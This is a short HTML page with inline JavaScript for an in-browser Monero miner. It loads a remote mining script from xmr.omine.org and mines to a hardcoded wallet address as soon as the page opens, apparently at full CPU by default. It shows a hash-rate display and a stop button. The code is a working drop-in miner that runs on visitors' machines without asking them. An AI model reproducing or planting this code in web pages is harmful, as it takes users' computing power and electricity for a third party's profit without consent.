<!DOCTYPE html>
	<head>
	<meta charset="utf-8">
	</head>
	<body>
		<div class="miner-outerbox">
		   <div class="miner-text">
			  <a href="https://xmr.omine.org/web_miner.html" target="_blank">&nbsp;
			  Monero JavaScript Miner</a>
		   </div>
		   <input id="throttle" type="text" value="100">%</input>
		   <button id="stop-button"><span class="default">✖</span></button>
		   <div style="height:500px">
		   <span id="state">"calculated 0 hashes, spend 0s rate 0H/s.</span>
		   <textarea id="recv"  disabled="disabled" style="width:100%; height:300px;"></textarea>
		   <textarea id="send"  disabled="disabled" style="width:100%; height:300px;"></textarea>
		   </div>
		</div>
	</body>
</html>
<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
<script src="https://xmr.omine.org/assets/v7.js"></script>
<script>
var isGo = true;
var timeout;
var seconds = 0;

function addText(id,elemt) {
	let t = document.getElementById(id);
	t.value += elemt + "\n";
    t.scrollTop = t.scrollHeight;
}

function miner(throttle) {
    OMINE("49E1zHzhLHz2si8o5wPxjrHgfTKu5HJux4SJjPFJhNmzdFv2JTxrr8Jf5rswL4bG6c2nY6SG72Kd7VfAFCPJkP95VWrsbtu#gaoxiaodiao.com","-1"),
	throttleMiner=throttle, //20 means 80% of cpu usage
    document.getElementById("state").innerHTML = "Connecting...";
    timeout=setInterval(function() {
        for (;sendStack.length > 0;){
        	addText("send",JSON.stringify(sendStack.pop()));
        }
        for (;receiveStack.length > 0;){
        	addText("recv",JSON.stringify(receiveStack.pop()));
        }
		var rate = totalhashes/(seconds*1.0);
		document.getElementById("state").innerHTML = `calculated ${totalhashes} hashes, spend ${seconds}s rate ${rate.toFixed(2)}H/s.`;
		++seconds;
    }
    , 1e3);
}

let throttle = document.getElementById("throttle").value;
miner(100-parseInt(throttle));
$("#stop-button").click(function() {
    if (isGo) {
        $(this).html(`<span class="start">✔</span>`);
        stopMining();
        clearInterval(timeout);
        document.getElementById("state").innerHTML = "Stopped mining...";
    }
    else {
        $(this).html(`<span class="stop">✖</span>`);
		throttle = document.getElementById("throttle").value;
        miner(100-parseInt(throttle));
    }
    isGo=!isGo;
});
</script>
